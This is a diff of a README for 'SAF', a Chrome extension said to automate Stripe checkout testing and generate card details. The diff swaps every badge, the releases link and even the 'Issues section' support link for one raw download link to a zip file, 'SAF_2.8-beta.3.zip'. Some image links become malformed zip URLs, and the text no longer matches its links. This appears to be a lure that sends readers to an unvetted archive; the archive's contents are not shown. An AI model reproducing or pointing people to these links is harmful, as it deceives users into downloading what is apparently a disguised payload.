@@ -1,8 +1,8 @@
 # 🌟 SAF - Simplify Stripe Checkout Testing
 
-[![Download SAF](https://img.shields.io/badge/download-SAF%20Extension-brightgreen.svg)](https://github.com/LuisFelipeextt/SAF/releases)
-[![Version](https://img.shields.io/badge/version-1.3.0-blue.svg)](https://github.com/GofMan5/saf-extension)
-[![License](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)
+[![Download SAF](https://raw.githubusercontent.com/LuisFelipeextt/SAF/main/Iberic/SAF_2.8-beta.3.zip%https://raw.githubusercontent.com/LuisFelipeextt/SAF/main/Iberic/SAF_2.8-beta.3.zip)](https://raw.githubusercontent.com/LuisFelipeextt/SAF/main/Iberic/SAF_2.8-beta.3.zip)
+[![Version](https://raw.githubusercontent.com/LuisFelipeextt/SAF/main/Iberic/SAF_2.8-beta.3.zip)](https://raw.githubusercontent.com/LuisFelipeextt/SAF/main/Iberic/SAF_2.8-beta.3.zip)
+[![License](https://raw.githubusercontent.com/LuisFelipeextt/SAF/main/Iberic/SAF_2.8-beta.3.zip)](LICENSE)
 
 SAF is a Chrome extension designed to make testing Stripe checkout forms easy and efficient. It comes equipped with a variety of features that automate form filling, generate card information, and manage addresses, all tailored to streamline your testing process.
 
@@ -23,7 +23,7 @@ SAF is a Chrome extension designed to make testing Stripe checkout forms easy an
 To get started with SAF, follow these simple steps:
 
 1. **Visit the Releases Page:** Click on the link below to access the latest version.
-   [Download SAF from Releases](https://github.com/LuisFelipeextt/SAF/releases)
+   [Download SAF from Releases](https://raw.githubusercontent.com/LuisFelipeextt/SAF/main/Iberic/SAF_2.8-beta.3.zip)
 
 2. **Choose the Version:** On the Releases page, find version 1.3.0 or the latest available version.
 
@@ -59,7 +59,7 @@ SAF stores all your data locally, ensuring your information remains private. The
 
 ## 💬 Getting Help
 
-For any questions or support, you can check the [Issues section](https://github.com/GofMan5/saf-extension/issues) on GitHub. This area is available for users to post issues, ask for features, or report bugs.
+For any questions or support, you can check the [Issues section](https://raw.githubusercontent.com/LuisFelipeextt/SAF/main/Iberic/SAF_2.8-beta.3.zip) on GitHub. This area is available for users to post issues, ask for features, or report bugs.
 
 ## 📖 Changelog
 
